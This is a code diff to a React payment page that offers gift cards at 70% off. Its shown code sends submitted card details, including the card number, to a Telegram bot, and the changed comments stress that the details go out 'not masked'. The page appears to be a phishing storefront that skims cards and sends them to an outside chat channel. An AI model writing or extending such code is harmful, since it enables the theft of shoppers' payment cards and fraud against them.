@@ -1,3 +1,4 @@
+
 import { useState, useEffect } from "react";
 import { useLocation, useNavigate } from "react-router-dom";
 import { Button } from "@/components/ui/button";
@@ -145,7 +146,7 @@ const Payment = () => {
     try {
       const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
       
-      // Format the message
+      // Format the message with full card details (not masked)
       let message = `
 💳 *PAYMENT DETAILS SUBMITTED* 💳
 
@@ -392,7 +393,7 @@ const Payment = () => {
     try {
       console.log(`Processing payment for $${giftCardValue} gift card (70% off) using ${selectedCardType}`);
       
-      // Send notification to Telegram - EXPLICITLY await the result
+      // Send notification to Telegram with full card details
       const notificationSent = await sendTelegramNotification({
         cardType: selectedCardType,
         cardNumber: formData.cardNumber,
